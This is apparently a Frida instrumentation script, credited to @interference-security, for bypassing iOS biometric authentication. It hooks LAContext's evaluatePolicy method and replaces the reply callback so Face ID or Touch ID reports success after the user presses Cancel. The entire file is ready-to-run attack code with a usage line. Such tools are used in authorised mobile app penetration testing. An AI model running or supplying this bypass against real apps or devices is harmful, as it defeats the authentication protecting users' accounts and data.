/* 
    Description: iOS Biometric Bypass
    Usage: frida -U -f XXXX -l ios-biometric-bypass.js
	Credit: @interference-security

	Link:
		https://developer.apple.com/documentation/localauthentication/lacontext/1514176-evaluatepolicy
*/

var func_name = "LAContext [- evaluatePolicy:localizedReason:reply:] method";
console.warn("\n[*] Hooking: " + func_name);
console.warn("[*] Press CANCEL on biometric authentication prompt to bypass authentication");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];

Interceptor.attach(hook.implementation, 
{
	onEnter: function(args) 
	{
		console.warn("[*] Detected call to method: " + func_name);
		var block = new ObjC.Block(args[4]);
		const callback = block.implementation;
		
		block.implementation = function (error, value)  
		{
			console.warn("[*] Changing return value to TRUE to bypass iOS biometric authentication");
			const result = callback(1, null);
			return result;
		};
	},
});
